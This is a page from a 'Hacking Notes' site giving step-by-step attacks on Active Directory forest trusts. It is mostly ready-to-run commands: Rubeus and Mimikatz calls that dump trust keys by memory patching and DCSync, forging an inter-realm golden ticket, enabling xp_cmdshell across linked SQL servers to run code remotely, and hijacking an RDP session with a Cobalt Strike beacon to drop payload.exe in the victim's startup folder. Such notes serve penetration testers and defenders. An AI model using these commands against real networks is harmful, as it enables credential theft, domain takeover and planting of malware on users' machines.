<!DOCTYPE html>

<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Cross Forest Attacks | Hacking Notes</title>
<meta name="generator" content="Jekyll v3.8.4" />
<meta property="og:title" content="Cross Forest Attacks" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="In this section we are going to abuse trusts between forests." />
<meta property="og:description" content="In this section we are going to abuse trusts between forests." />
<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/active-directory/cross-forest-attacks/" />
<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/active-directory/cross-forest-attacks/" />
<meta property="og:site_name" content="Hacking Notes" />
<script type="application/ld+json">
{"description":"In this section we are going to abuse trusts between forests.","url":"http://0.0.0.0:4000/hackingnotes/active-directory/cross-forest-attacks/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Cross Forest Attacks","@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->

		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />

		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
		<link rel="stylesheet" href="/hackingnotes/css/main.css">
		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">

		
	</head>

	<body>
		<header>
			<h1>
				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
				Hacking Notes
				<button type="button" class="open-nav" id="open-nav"></button>
			</h1>

			<form action="/hackingnotes/search/" method="get">
				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
				<input type="submit" value="Search" style="display: none;">
			</form>

			<nav class="full-navigation">
				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/">What is this?</a>
					</li>
				</ul>

				<ul>
					
					
						<li class="nav-item top-level current">
							
							<a href="/hackingnotes/active-directory/introduction/">Active Directory</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/introduction/">Basics</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/lateral-movement/">Lateral Movement</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-persistence/">Domain Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-privesc/">Domain Privilege Escalation</a></li>
								
									<li class="nav-item current"><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-certificate-services/">Active Directory Certificate Services</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/securing-ad/">Hardening Active Directory</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/html-application/">HTML Application (HTA)</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/exploiting/bof-windows/">Windows BoF 32bit</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/exploiting/bof-linux/">Linux BoF 32bit</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/other/hacking-aws/">Other</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/ata-evasion/">ATA Evasion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-applocker/">Bypass APPLocker</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/red-team/introduction/">Red Team</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/introduction/">Introduction</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/opsec-infrastructure/">OPSEC Infrastructure</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/c2-cobaltstrike/">C2 - Cobalt Strike</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/host-reconnaissance/">Host Reconnaissance</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/host-persistence/">Host Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/host-privilege-escalation/">Host Privilege Escalation</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/lateral-movement/">Lateral Movement</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/credentials-and-user-impersonation/">Credentials & User Impersonation</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/kibana/">Kibana - The Security App</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/pivoting/">Pivoting</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/ms-sql-servers/">MS SQL Servers</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/data-protection-api/">Data Protection API (DPAPI)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/laps/">Local Administrator Password Solution (LAPS)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/microsoft-defender/">Microsoft Defender Antivirus</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/application-whitelisting/">Application Whitelisting</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/exfiltration/">Exfiltration</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/services/ftp/">Services</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/ssh/">PORT 22/tcp - SSH</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/software/wordpress/">Software</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/owa-exchange/">OWA Exchange</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/web/file-inclusion/">Web</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
								
							</ul>
						</li>
					
				</ul>

				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/changelog/">Change Log</a>
					</li>
				</ul>
			</nav>
		</header>

		<section class="main">
			<div class="page-header">
				<h2>Active Directory</h2>
				<h3>Cross Forest Attacks</h3>
			</div>
			<article class="content">
				<p>In this section we are going to abuse trusts between forests.</p>

<h1 id="one-way-inbound">One-Way (Inbound)</h1>

<p>When a trust is inbound in our perspective, it means that principals in our domain can be granted access to resources in the foreign domain.</p>

<ul>
  <li>PowerView (dev):</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainComputer -Domain external.local -Properties DNSHostName
</code></pre></div></div>
<ul>
  <li>BloodHound:</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\SharpHound.exe -c DcOnly -d external.local
</code></pre></div></div>

<p>We can enuemrate also groups that contains users outside of its domain.</p>

<ul>
  <li>PowerView (dev):</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainForeignGroupMember -Domain external.local 
</code></pre></div></div>
<p>The <code class="highlighter-rouge">MemberName</code> field contains a SID that can be resolved in our current domain with:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ConvertFrom-SID  S-1-5-21-3263068140-2042693922-2891547269-1132
</code></pre></div></div>

<p>To hop a domain trust using Kerberos, we first need an inter-realm Key. We need a TGT for the target user.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgt /user:admin /domain:corp.local /aes256:&lt;aes256&gt; /nowrap
</code></pre></div></div>

<p>Then, we can use the TGT to request a referral ticket form the current domain to the target domain.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgs /service:krbtgt/target-domain.com /domain:corp.local /dc:dc01.corp.local /ticket:&lt;base64-ticket&gt; /nowrap
</code></pre></div></div>

<blockquote>
  <p><strong>Note</strong>: The inter-realm ticket is <code class="highlighter-rouge">rc4_hmac</code> even if we created the TGT with <code class="highlighter-rouge">aes256_cts_hmac_sha1</code>. This is a default configuration unless AES has ben specifically configured on the trust.</p>
</blockquote>

<p>Finally we an use this inter-realm ticket to request a TGS.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgs /service:cifs/dc.target-domain.com /domain:target-domain.com /dc:dc.target-domain.com /ticket:&lt;base64-inter-realm&gt; /nowrap
</code></pre></div></div>

<h1 id="one-way-outbound">One-Way (Outbound)</h1>

<p>If Domain A (Me) trusts Domain B, users in Domain B can access resources in Domain A but users in Domain A should not be able to access resources in Domain B. But there are some circumstances in which we can slide under the radar. An example of this includes SQL Server Links.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainTrust -Domain corp.local
</code></pre></div></div>

<h2 id="trusted-domain-object-tdo-user">Trusted Domain Object (TDO) user</h2>

<p>But, we can still partially exploit this trus and obtain a “Domain User” of the trust abusing the Trusted Domain Object (TDO). Both domains in a trust relationship store a shared password which is automatically changed every 30 days. These objects are stored in the system contained and can be read via LDAP.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain corp.local --attributes distinguishedName,name,flatName,trustDirection
</code></pre></div></div>

<h3 id="retrieving-the-trusted-key">Retrieving the Trusted Key</h3>

<p>There are two ways:</p>

<ul>
  <li>Moving laterally to the DC and dump the key from memory.</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; mimikatz lsadump::trust /patch
</code></pre></div></div>

<blockquote>
  <p><strong>Note</strong>: Memory patching is very risky, particularly on domain controllers.</p>
</blockquote>

<ul>
  <li>Using DCSync with the TDO GUID.</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObject -Identity <span class="s2">"CN=target-domain.com,CN=System,DC=corp,DC=local"</span> | <span class="nb">select </span>objectGuid
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; mimikatz @lsadump::dcsync /domain:corp.local /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
</code></pre></div></div>

<p><code class="highlighter-rouge">[Out]</code> and <code class="highlighter-rouge">[Out-1]</code> are the “new” and “old” passwords respectively.  In most cases, the current <code class="highlighter-rouge">[Out]</code> key is the one you want.</p>

<h3 id="creating-a-tgt">Creating a TGT</h3>

<p>In addition, there is also a “trust account” which is created in the “trusted” domain, with the name of the “trusting” domain.  For instance, if we get all the user accounts in the DEV domain, we’ll see CYBER$ and STUDIO$, which are the trust accounts for those respective domain trusts.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"

[*] TOTAL NUMBER OF SEARCH RESULTS: 11

        [...]
	[+] cn : CORP$
	[+] cn : TARGET$
</code></pre></div></div>

<p>This meand TARGET domain will have a trust account called <code class="highlighter-rouge">CORP$</code>. This is the account we must impersonate to request Kerberos tickets across the trust.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgt /user:CORP$ /domain:target-domain.com /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap
</code></pre></div></div>

<blockquote>
  <p><strong>Note</strong>: RC4 tickets are used by default across trusts.</p>
</blockquote>

<h2 id="trust-abuse-with-mssql-server">Trust Abuse with MSSQL Server</h2>

<p>MSSQL Servers are generally deployed in plenty windows domain. SQL Servers provide very good options for lateral movement as domain users can be mapped to dabase roles.</p>

<p>A fantastic tool to abuse MSSQL is <code class="highlighter-rouge">PowerUpSQLl</code>:</p>

<ul>
  <li><a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerUpSQL.psd1
</code></pre></div>    </div>
  </li>
</ul>

<blockquote>
  <p><strong>Note</strong>: Important! Write <code class="highlighter-rouge">Import-Module</code> and import which have <strong>PSD1</strong> extension.</p>
</blockquote>

<p>We can discover SQL servers:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-SQLInstanceDomain
</code></pre></div></div>

<p>We can check accessibility:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
</code></pre></div></div>
<p>Gather information:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
</code></pre></div></div>

<h3 id="database-links">Database Links</h3>

<p>A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of databases links between Microsoft SQL Servers, it is possible to execute stored procedures which means RCE.</p>

<p>Database link works even across forest trusts.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-SQLServerLink -Instance mssql.corp.local -Verbose
</code></pre></div></div>

<p>So we can execute queries on the remote Server Link, see if this server has others links and above, instead of doing it manually that will be explained in a note, exists a script that crawls all the mssql server links.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-SQLServerLinkCrawl -Instance mssql.corp.local -Verbose
</code></pre></div></div>

<blockquote>
  <p><strong>Note</strong>: Manual way:</p>

  <p>See if has a server link:
<code class="highlighter-rouge">select * from master..sysservers</code></p>

  <p>Openquery() function can be used to run quieries on a linked database:
<code class="highlighter-rouge">select * from openquery("CORP-SQL1", 'select * from master..sysservers')</code></p>

  <p><code class="highlighter-rouge">select * from openquery("CORP-SQL1", ''select * from openquery("CORP-SQL2", 'master..sysservers'')')</code></p>
</blockquote>

<p>To execute commands from MSSQL server we need to use <code class="highlighter-rouge">xp_cmdshell</code>. If <code class="highlighter-rouge">rpcout</code> is enabled <code class="highlighter-rouge">xp_cmdshell</code> can be enabled using:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "other-sql"
</code></pre></div></div>

<p>And finally:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-SQLServerLinkCrawl -Instance mssql.corp.local -Query <span class="s2">"exec master..xp_cmdshell 'whoami'"</span>
</code></pre></div></div>

<h2 id="rdpinception">RDPInception</h2>

<p>Another way is via RDP drive sharing (<strong>RDPInception</strong>). When a user enables drive sharing for their RDP sessions, it creates a mount-point on the target machine that maps back to their local machine. If the target machine is compromised, we may migrate into RDP users’s session and use this mount-point to write files directly onto their machine. Useful for dropping payloads into their startup folder which would be executed the next time they logon.</p>

<p>The strategy is to find principals in our current domain that are not native to that domain, but are from <code class="highlighter-rouge">external.local</code>.</p>

<ul>
  <li>PowerView (dev):</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainForeignGroupMember -Domain corp.local
</code></pre></div></div>

<blockquote>
  <p><strong>Note</strong>: We can not convert the SID with <code class="highlighter-rouge">ConvertFrom-SID</code> since we don’t have access to the other Domain.</p>
</blockquote>

<p>A nice methodology is to enumerate the current domain and find instances where members of the foreign domain, have privileged access (local admin, RDP, WinRM, DCOM access), move laterally to those machines, and camp there until you see a member authenticate. Then, impersonate them to hop the trust.</p>

<p><code class="highlighter-rouge">Get-DomainGPOUserLocalGroupMapping</code> and <code class="highlighter-rouge">Find-DomainLocalGroupMember</code> can work for that task:</p>

<ul>
  <li>PowerView (dev):</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainGPOUserLocalGroupMapping  -Identity "Jump Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName
</code></pre></div></div>
<p>Once the foreign user logs on one of our compromised computers, we can hijack his RDP session. Example above from Cobalt Strike.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; ps

 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 2365  1012  rdpclip.exe                  x64   3           EXT\j.doe
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; inject 2365 x64 tcp-local
[+] established link to child beacon: 10.10.10.10
</code></pre></div></div>

<p>Now at that moment we can do import PowerView and enumerate the domain, because we simply hijacked and existing authenticated session and we are inside a valid <code class="highlighter-rouge">external.local</code> domain.</p>

<p>Inside the user RDP session if <code class="highlighter-rouge">Drive Sharing</code> is enabled a <strong>UNC tsclient</strong> has a mount point for every drive that is being shared over RDP.</p>

<p><code class="highlighter-rouge">\\tsclient\C</code> is the <code class="highlighter-rouge">C:\</code> drive of the origin machine of the RDP session, so we can upload a bat or exe to the users startup folder.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; cd \\tsclient\c\Users\j.doe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon&gt; upload payload.exe
</code></pre></div></div>

<h1 id="across-forests-using-trust-tickets">Across Forests using Trust Tickets</h1>

<p>First we need to retrieved the Trust Key:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::trust /patch"'</span>
Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:dcorp\mcorp$"'</span>
</code></pre></div></div>

<blockquote>
  <p><strong>Note</strong>: The access we will have will be limited to what our DA account is configured to have on the other Forest!</p>
</blockquote>

<p>An <strong>inter-realm TGT</strong> can be forged:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /rc4:cd3fb1b0b49c7a56d285fffdd1399231 /service:krbtgt /target:extcorp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'</span>
</code></pre></div></div>
<ul>
  <li><strong>Invoke-Mimikatz</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><strong>Parameter</strong></th>
      <th style="text-align: center"><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">/domain:sub.corp.local</td>
      <td style="text-align: center">Current Domain FQDN</td>
    </tr>
    <tr>
      <td style="text-align: center">/sid:S-1-5-21-268341927-4156873456-1784235843</td>
      <td style="text-align: center">Current Domain SID</td>
    </tr>
    <tr>
      <td style="text-align: center">/user:Administrator</td>
      <td style="text-align: center">User to impersonate</td>
    </tr>
    <tr>
      <td style="text-align: center">/rc4:a9b30e5b0dc865eadcea9411e4ade72d</td>
      <td style="text-align: center">krbtgt hash of Current Domain</td>
    </tr>
    <tr>
      <td style="text-align: center">/service:krbtgt</td>
      <td style="text-align: center">krbtgt service to abuse</td>
    </tr>
    <tr>
      <td style="text-align: center">/target:extcorp.local</td>
      <td style="text-align: center">Target domain</td>
    </tr>
    <tr>
      <td style="text-align: center">/tiket:C:\Windows\Temp\trust_tkt.kirbi</td>
      <td style="text-align: center">File to store the ticket</td>
    </tr>
  </tbody>
</table>

<p>Now we can request a TGS for <code class="highlighter-rouge">cifs</code> service on the dc of the trusted forest.</p>

<ul>
  <li>Asktgs.exe (kekeo_old)</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\asktgs.exe c:\temp\trust_forest_tkt.kirbi CIFS/dc01.extcorp.local
</code></pre></div></div>

<ul>
  <li>Rubeus.exe
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgs /ticket:trust_forest_tkt.kirbi /dc:dc01.extcorp.local /service:CIFS/dc01.extcorp.local
</code></pre></div>    </div>
  </li>
</ul>

<p>And inject the ticket on the current session:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\kirbikator.exe lsa .\CIFS.dc01.extcorp.local.kirbi
</code></pre></div></div>
<blockquote>
  <p><strong>Note</strong>: We can not list all the file system of other forest. We can only list shared folders.</p>
</blockquote>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls \\dc01.extcorp.local\share\
</code></pre></div></div>

			</article>
		</section>

		<script>
			document.getElementById("open-nav").addEventListener("click", function () {
				document.body.classList.toggle("nav-open");
			});
		</script>
	</body>
</html>
